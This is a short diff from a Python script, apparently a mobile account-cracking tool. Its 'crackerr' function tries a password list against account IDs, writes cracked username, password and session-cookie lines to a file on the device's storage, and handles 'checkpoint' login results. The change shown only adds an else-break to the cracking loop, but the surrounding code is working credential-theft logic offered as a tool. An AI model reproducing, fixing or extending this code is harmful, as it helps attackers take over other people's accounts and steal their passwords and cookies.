@@ -545,6 +545,8 @@ def crackerr(ids,passlist):
                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{user}|{pas}|{kuki}\n")
                            oks.append(user)
                            break
+                else:
+                    break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
